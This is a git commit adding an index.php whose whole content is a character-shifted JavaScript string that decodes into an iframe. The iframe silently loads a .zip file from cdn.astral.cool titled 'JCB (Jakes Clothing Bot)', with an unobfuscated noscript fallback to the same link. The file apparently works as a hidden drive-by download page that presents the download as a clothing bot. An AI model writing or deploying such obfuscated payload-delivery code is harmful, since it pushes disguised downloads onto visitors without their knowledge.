0028d95ef7bda0fa2d0d990d461337fef43ca73d
payocoder <52519968+payocoder@users.noreply.github.com>
2020-11-24 12:51:57 -0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,7 @@
+<?php
+
+print "<script>var s=\"=jgsbnf!tsd>#iuuqt;00deo/btusbm/dppm0:3bff1bf.c2e8.54c8.9c6:.887f3c712cgf058cc3:c73c/{jq#!ujumf>#KDC!)Kblft!Dmpuijoh!Cpu*#?=0jgsbnf?\";var m=\"\";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script><noscript><iframe src=\"https://cdn.astral.cool/92aee0ae-b1d7-43b7-8b59-776e2b601bfe/47bb29b62b.zip\" title=\"JCB (Jakes Clothing Bot)\"></iframe>
+\n";
+print "</noscript>\n";
+
+?>
